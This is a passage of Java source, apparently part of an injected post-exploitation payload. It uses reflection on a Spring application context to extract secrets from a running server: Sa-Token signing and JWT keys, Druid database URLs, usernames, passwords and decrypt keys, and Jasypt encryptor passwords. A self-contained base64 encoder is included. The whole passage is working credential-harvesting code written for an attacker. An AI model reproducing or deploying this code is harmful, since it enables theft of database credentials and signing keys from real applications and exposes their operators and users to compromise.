                            cl.loadClass("cn.dev33.satoken.stp.StpLogic"));
                    if (names != null && names.length > 0) {
                        Method getBeanByName = ctx.getClass().getMethod("getBean", String.class);
                        for (int i = 0; i < names.length; i++) {
                            Object stpLogic = getBeanByName.invoke(ctx, names[i]);
                            String signKey = readFieldStr(stpLogic, "tokenSignKey");
                            String jwtKey = readFieldStr(stpLogic, "jwtSecretKey");
                            if (signKey != null) { out.append("  [").append(names[i]).append("] tokenSignKey = ").append(signKey).append("\n"); found = true; }
                            if (jwtKey != null) { out.append("  [").append(names[i]).append("] jwtSecretKey = ").append(jwtKey).append("\n"); found = true; }
                        }
                    }
                } catch (Exception ignored) {}
            }
            if (!found) out.append("  (none)\n");
            out.append("\n");
        } catch (Exception e) {
            out.append("  (none)\n\n");
        }
    }
    private void extractDruidDataSource(Object ctx, StringBuilder out) {
        if (ctx == null) return;
        out.append("[Druid DataSource]\n");
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class druidClass = cl.loadClass("com.alibaba.druid.pool.DruidDataSource");
            Method getBeanNames = ctx.getClass().getMethod("getBeanNamesForType", Class.class);
            String[] names = (String[]) getBeanNames.invoke(ctx, druidClass);
            if (names == null || names.length == 0) { out.append("  (none)\n\n"); return; }
            Method getBean = ctx.getClass().getMethod("getBean", String.class);
            for (int i = 0; i < names.length; i++) {
                try {
                    Object ds = getBean.invoke(ctx, names[i]);
                    out.append("  [").append(names[i]).append("]\n");
                    String url = readFieldStr(ds, "jdbcUrl");
                    if (url == null) url = readFieldStr(ds, "url");
                    String user = readFieldStr(ds, "username");
                    String pw = readFieldStr(ds, "password");
                    if (url != null) out.append("    url = ").append(url).append("\n");
                    if (user != null) out.append("    username = ").append(user).append("\n");
                    if (pw != null) out.append("    password = ").append(pw).append("\n");
                    Object connProps = readFieldObj(ds, "connectionProperties");
                    if (connProps instanceof Properties) {
                        Object decryptKey = ((Properties) connProps).get("config.decrypt.key");
                        if (decryptKey != null)
                            out.append("    decryptKey = ").append(decryptKey).append("\n");
                    }
                    out.append("\n");
                } catch (Exception ignored) {}
            }
        } catch (Exception e) {
            out.append("  (none)\n\n");
        }
    }
    private void extractJasyptEncryptor(Object ctx, StringBuilder out) {
        if (ctx == null) return;
        try {
            out.append("[Jasypt Encryptor]\n");
            boolean found = false;
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            try {
                Class seClass = cl.loadClass("org.jasypt.encryption.StringEncryptor");
                Method getBeanNames = ctx.getClass().getMethod("getBeanNamesForType", Class.class);
                String[] seNames = (String[]) getBeanNames.invoke(ctx, seClass);
                if (seNames != null && seNames.length > 0) {
                    Method getBeanByName = ctx.getClass().getMethod("getBean", String.class);
                    for (int i = 0; i < seNames.length; i++) {
                        Object encryptor = getBeanByName.invoke(ctx, seNames[i]);
                        String password = readFieldStr(encryptor, "password");
                        if (password == null) password = readFieldStr(encryptor, "key");
                        if (password != null) {
                            out.append("  [").append(seNames[i]).append("] password = ").append(password).append("\n");
                            found = true;
                        }
                    }
                }
            } catch (Exception ignored) {}
            if (!found) {
                try {
                    Class ubsClass = cl.loadClass("com.ulisesbocchio.jasyptspringboot.StringEncryptor");
                    Method getBeanNames = ctx.getClass().getMethod("getBeanNamesForType", Class.class);
                    String[] ubsNames = (String[]) getBeanNames.invoke(ctx, ubsClass);
                    if (ubsNames != null && ubsNames.length > 0) {
                        Method getBeanByName = ctx.getClass().getMethod("getBean", String.class);
                        for (int i = 0; i < ubsNames.length; i++) {
                            Object encryptor = getBeanByName.invoke(ctx, ubsNames[i]);
                            String password = readFieldStr(encryptor, "password");
                            if (password != null) {
                                out.append("  [").append(ubsNames[i]).append("] password = ").append(password).append("\n");
                                found = true;
                            }
                        }
                    }
                } catch (Exception ignored) {}
            }
            if (!found) {
                try {
                    Class eprClass = cl.loadClass("com.ulisesbocchio.jasyptspringboot.EncryptablePropertyResolver");
                    Method getBeanNames = ctx.getClass().getMethod("getBeanNamesForType", Class.class);
                    String[] eprNames = (String[]) getBeanNames.invoke(ctx, eprClass);
                    if (eprNames != null && eprNames.length > 0) {
                        Method getBeanByName = ctx.getClass().getMethod("getBean", String.class);
                        for (int i = 0; i < eprNames.length; i++) {
                            Object resolver = getBeanByName.invoke(ctx, eprNames[i]);
                            Object enc = readFieldObj(resolver, "encryptor");
                            if (enc != null) {
                                String password = readFieldStr(enc, "password");
                                if (password != null) {
                                    out.append("  [").append(eprNames[i]).append("] password = ").append(password).append("\n");
                                    found = true;
                                }
                            }
                        }
                    }
                } catch (Exception ignored) {}
            }
            if (!found) {
                try {
                    Method getBeanNames = ctx.getClass().getMethod("getBeanDefinitionNames");
                    String[] names = (String[]) getBeanNames.invoke(ctx);
                    Method getBeanByName = ctx.getClass().getMethod("getBean", String.class);
                    for (int i = 0; i < names.length; i++) {
                        try {
                            Object bean = getBeanByName.invoke(ctx, names[i]);
                            if (bean == null) continue;
                            Class beanClass = bean.getClass();
                            while (beanClass != null) {
                                String className = beanClass.getName();
                                if ("org.jasypt.encryption.pbe.StandardPBEStringEncryptor".equals(className)
                                        || "org.jasypt.encryption.pbe.PooledPBEStringEncryptor".equals(className)) {
                                    String password = readFieldStr(bean, "password");
                                    if (password != null) {
                                        out.append("  [").append(names[i]).append("] password = ").append(password).append("\n");
                                        found = true;
                                    }
                                    break;
                                }
                                beanClass = beanClass.getSuperclass();
                            }
                        } catch (Exception ignored) {}
                    }
                } catch (Exception ignored) {}
            }
            if (!found) out.append("  (none)\n");
            out.append("\n");
        } catch (Exception ignored) {}
    }
    private String readAnyField(Object obj, String[] fieldNames) {
        for (int i = 0; i < fieldNames.length; i++) {
            String val = readFieldStr(obj, fieldNames[i]);
            if (val != null) return val;
        }
        for (int i = 0; i < fieldNames.length; i++) {
            String getter = "get" + fieldNames[i].substring(0, 1).toUpperCase()
                    + fieldNames[i].substring(1);
            String val = callMethodStr(obj, getter);
            if (val != null) return val;
        }
        return null;
    }
    private String readFieldStr(Object obj, String fieldName) {
        try {
            Object val = readFieldObj(obj, fieldName);
            return val == null ? null : val.toString();
        } catch (Exception ignored) {}
        return null;
    }
    private Object readFieldObj(Object obj, String fieldName) {
        if (obj == null) return null;
        try {
            if (fieldName.contains(".")) {
                String[] parts = fieldName.split("\\.", 2);
                Object sub = readFieldObj(obj, parts[0]);
                return readFieldObj(sub, parts[1]);
            }
            Field f = findField(obj.getClass(), fieldName);
            if (f != null) {
                f.setAccessible(true);
                return f.get(obj);
            }
        } catch (Exception ignored) {}
        return null;
    }
    private Field findField(Class clazz, String name) {
        while (clazz != null && clazz != Object.class) {
            try {
                return clazz.getDeclaredField(name);
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        return null;
    }
    private Object callMethod(Object obj, String methodName) {
        if (obj == null) return null;
        try {
            Method m = obj.getClass().getMethod(methodName);
            m.setAccessible(true);
            return m.invoke(obj);
        } catch (NoSuchMethodException ignored) {
        } catch (IllegalAccessException ignored) {
        } catch (InvocationTargetException ignored) {}
        try {
            Class clazz = obj.getClass();
            while (clazz != null) {
                try {
                    Method m = clazz.getDeclaredMethod(methodName);
                    m.setAccessible(true);
                    return m.invoke(obj);
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
        } catch (Exception ignored) {}
        return null;
    }
    private String callMethodStr(Object obj, String methodName) {
        Object r = callMethod(obj, methodName);
        return r == null ? null : r.toString();
    }
    private static String base64Encode(byte[] data) {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        StringBuilder sb = new StringBuilder();
        int i = 0;
        while (i < data.length) {
            int b0 = data[i++] & 0xFF;
            if (i == data.length) {
                sb.append(chars.charAt(b0 >> 2));
                sb.append(chars.charAt((b0 & 0x3) << 4));
                sb.append("==");
                break;
            }
            int b1 = data[i++] & 0xFF;
            if (i == data.length) {
                sb.append(chars.charAt(b0 >> 2));
                sb.append(chars.charAt(((b0 & 0x3) << 4) | ((b1 & 0xF0) >> 4)));
                sb.append(chars.charAt((b1 & 0xF) << 2));
                sb.append('=');
                break;
            }
            int b2 = data[i++] & 0xFF;
            sb.append(chars.charAt(b0 >> 2));
            sb.append(chars.charAt(((b0 & 0x3) << 4) | ((b1 & 0xF0) >> 4)));
            sb.append(chars.charAt(((b1 & 0xF) << 2) | ((b2 & 0xC0) >> 6)));
            sb.append(chars.charAt(b2 & 0x3F));
        }
        return sb.toString();
    }
}
